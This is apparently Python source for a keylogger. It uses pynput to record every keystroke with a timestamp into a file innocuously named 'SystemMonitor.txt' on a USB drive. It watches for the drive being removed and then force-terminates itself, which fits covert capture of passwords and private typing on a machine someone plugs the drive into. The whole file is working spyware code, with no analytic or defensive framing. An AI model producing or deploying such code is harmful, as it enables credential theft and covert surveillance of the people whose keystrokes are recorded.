from pynput import keyboard
import datetime
import os
import sys
import time
import threading
import atexit
import contextlib
import signal

def get_executable_directory():
    try:
        # Try to get the directory where the executable is located
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            return os.path.dirname(sys.executable)
        else:
            # Running as script
            return os.path.dirname(os.path.abspath(__file__))
    except Exception as e:
        # Fallback to current working directory if there's an error
        return os.getcwd()

# Get the directory and set up log file
current_dir = get_executable_directory()
log_file = os.path.join(current_dir, "SystemMonitor.txt")

# Global variables
should_stop = False
listener = None
usb_check_thread = None

def force_exit():
    """Force exit the program"""
    try:
        # Try to kill the process
        if sys.platform.startswith('win'):
            import ctypes
            ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.GetCurrentProcess(), 1)
        else:
            os.kill(os.getpid(), signal.SIGKILL)
    except:
        os._exit(1)

def safe_write_to_log(content):
    """Safely write to log file with immediate close"""
    max_retries = 3
    retry_delay = 0.1
    
    for attempt in range(max_retries):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(content)
                f.flush()
                os.fsync(f.fileno())
            return True
        except Exception as e:
            if attempt == max_retries - 1:
                return False
            time.sleep(retry_delay)
    return False

def check_usb_connected():
    """Check if the USB drive is still connected by trying to access the log file"""
    try:
        # First check if the directory still exists
        if not os.path.exists(os.path.dirname(log_file)):
            return False
            
        # Then try to open the file
        with open(log_file, "a", encoding="utf-8") as f:
            return True
    except:
        return False

def cleanup():
    """Cleanup function to be called on exit"""
    global should_stop, listener, usb_check_thread
    should_stop = True
    
    try:
        # Stop the keyboard listener
        if listener:
            listener.stop()
        
        # Stop the USB check thread
        if usb_check_thread and usb_check_thread.is_alive():
            usb_check_thread.join(timeout=0.5)
            
        # Final cleanup message
        safe_write_to_log(f"\nSystem activity log stopped at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    except:
        pass
    
    # Force exit after cleanup
    force_exit()

# Register cleanup functions
atexit.register(cleanup)
signal.signal(signal.SIGTERM, lambda signo, frame: cleanup())
signal.signal(signal.SIGINT, lambda signo, frame: cleanup())

def usb_check_loop():
    """Continuously check if USB is connected"""
    global should_stop
    consecutive_failures = 0
    max_failures = 3  # Number of consecutive failures before considering USB disconnected
    
    while not should_stop:
        if not check_usb_connected():
            consecutive_failures += 1
            if consecutive_failures >= max_failures:
                should_stop = True
                cleanup()
                return
        else:
            consecutive_failures = 0
        time.sleep(0.5)  # Check every 500ms

def on_press(key):
    if should_stop:
        return False
        
    try:
        # Get current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Handle special keys
        if key == keyboard.Key.space:
            key_char = " "
        elif key == keyboard.Key.enter:
            key_char = "[ENTER]"
        elif key == keyboard.Key.tab:
            key_char = "[TAB]"
        elif key == keyboard.Key.backspace:
            key_char = "[BACKSPACE]"
        elif key == keyboard.Key.delete:
            key_char = "[DELETE]"
        elif key == keyboard.Key.shift:
            key_char = "[SHIFT]"
        elif key == keyboard.Key.shift_r:
            key_char = "[SHIFT]"
        elif key == keyboard.Key.ctrl:
            key_char = "[CTRL]"
        elif key == keyboard.Key.ctrl_l:
            key_char = "[CTRL]"
        elif key == keyboard.Key.alt:
            key_char = "[ALT]"
        elif key == keyboard.Key.alt_l:
            key_char = "[ALT]"
        elif key == keyboard.Key.caps_lock:
            key_char = "[CAPS_LOCK]"
        elif key == keyboard.Key.up:
            key_char = "[UP_ARROW]"
        elif key == keyboard.Key.down:
            key_char = "[DOWN_ARROW]"
        elif key == keyboard.Key.left:
            key_char = "[LEFT_ARROW]"
        elif key == keyboard.Key.right:
            key_char = "[RIGHT_ARROW]"
        elif key == keyboard.Key.home:
            key_char = "[HOME]"
        elif key == keyboard.Key.end:
            key_char = "[END]"
        elif key == keyboard.Key.page_up:
            key_char = "[PAGE_UP]"
        elif key == keyboard.Key.page_down:
            key_char = "[PAGE_DOWN]"
        elif key == keyboard.Key.insert:
            key_char = "[INSERT]"
        elif key == keyboard.Key.menu:
            key_char = "[MENU]"
        elif key == keyboard.Key.num_lock:
            key_char = "[NUM_LOCK]"
        elif key == keyboard.Key.scroll_lock:
            key_char = "[SCROLL_LOCK]"
        elif key == keyboard.Key.pause:
            key_char = "[PAUSE]"
        elif key == keyboard.Key.print_screen:
            key_char = "[PRINT_SCREEN]"
        elif key == keyboard.Key.f1:
            key_char = "[F1]"
        elif key == keyboard.Key.f2:
            key_char = "[F2]"
        elif key == keyboard.Key.f3:
            key_char = "[F3]"
        elif key == keyboard.Key.f4:
            key_char = "[F4]"
        elif key == keyboard.Key.f5:
            key_char = "[F5]"
        elif key == keyboard.Key.f6:
            key_char = "[F6]"
        elif key == keyboard.Key.f7:
            key_char = "[F7]"
        elif key == keyboard.Key.f8:
            key_char = "[F8]"
        elif key == keyboard.Key.f9:
            key_char = "[F9]"
        elif key == keyboard.Key.f10:
            key_char = "[F10]"
        elif key == keyboard.Key.f11:
            key_char = "[F11]"
        elif key == keyboard.Key.f12:
            key_char = "[F12]"
        else:
            key_char = str(key).replace("'", "")
        
        # Write to log file
        if not safe_write_to_log(f"{timestamp} - {key_char}\n"):
            return False  # Stop listener if we can't write
            
    except Exception as e:
        return False

def on_release(key):
    if should_stop:
        return False
    return None  # Continue monitoring

# Create the log file if it doesn't exist and add start message
try:
    start_message = "System activity log started at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"
    if not os.path.exists(log_file):
        if not safe_write_to_log(start_message):
            sys.exit(1)
    else:
        # Add a new start message each time the script is run
        if not safe_write_to_log("\nSystem activity log restarted at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n"):
            sys.exit(1)
except Exception as e:
    sys.exit(1)  # Exit if we can't create the log file

# Start the USB check thread
usb_check_thread = threading.Thread(target=usb_check_loop)
usb_check_thread.daemon = True
usb_check_thread.start()

# Start the listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

try:
    while not should_stop:
        time.sleep(0.1)
        if not usb_check_thread.is_alive():
            break
    cleanup()
except:
    cleanup() 